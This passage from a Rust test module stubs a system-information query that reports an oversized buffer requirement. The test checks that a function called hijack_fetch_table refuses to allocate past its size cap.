        _class: u32,
        buf: *mut c_void,
        len: u32,
        ret: *mut u32,
    ) -> i32 {
        unsafe { *ret = QSI_MAX_CAP + 0x1000 };
        let _ = (buf, len);
        0xC0000004u32 as i32
    }

    #[test]
    fn qsi_resize_refuses_over_cap_requirement() {
        let r = unsafe { hijack_fetch_table(fake_qsi_absurd_size) };
        assert!(r.is_err());
    }
}
